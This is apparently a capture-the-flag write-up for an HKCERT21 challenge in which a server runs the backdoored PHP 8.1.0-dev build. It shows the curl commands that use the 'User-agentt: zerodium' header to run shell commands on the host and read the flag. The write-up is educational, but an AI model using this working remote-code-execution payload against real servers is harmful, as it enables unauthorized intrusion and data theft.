# The Wilderness 荊棘海 (100 point, 39 solves, ★☆☆☆☆) [First blood 🩸]
---
Solved by: Kaiziron

### Description :
```
Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox... What can go wrong?

http://chalp.hkcert21.pwnable.hk:28364/

Attachments
sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip
```
---
### Solution :

This challenge is easy to solve if you are familiar with the vulnerability, 

I did a hackthebox machine `Knife` with the same vulnerability not long ago, so I identified the vulnerability quickily and solved the challenge quickily in around 2 min after I discovered this challenge

After I see the description is about the PHP version, I immediately check for the PHP version the challenge is using

```
curl -i http://chalp.hkcert21.pwnable.hk:28364/
HTTP/1.1 200 OK
Host: chalp.hkcert21.pwnable.hk:28364
Date: Tue, 16 Nov 2021 06:07:19 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8

<h1>It Works!</h1>
```
It is using PHP 8.1.0-dev, which is known to be backdoored

![](https://i.imgur.com/XOrWHpj.png)

This is the commit in github that added the backdoor

To exploit this, we can specify a HTTP request header "User-agentt" and set the value to be `zerodium<php code>` 

```
curl -H 'User-agentt: zerodiumsystem("ls -la");'  http://chalp.hkcert21.pwnable.hk:28364/
total 12
drwxr-xr-x 1 root root 4096 Nov  7 04:22 .
drwxr-xr-x 1 root root 4096 Nov  7 04:22 ..
-rw-r--r-- 1 root root   90 Nov  7 03:55 index.php
```

We can execute command using the system() function in php

So we can just read the index.php and get the flag

```
curl -H 'User-agentt: zerodiumsystem("cat index.php");'  http://chalp.hkcert21.pwnable.hk:28364/
<h1>It Works!</h1>
<?php // hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n} ?>
<h1>It Works!</h1>
```

### Flag :
`hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}`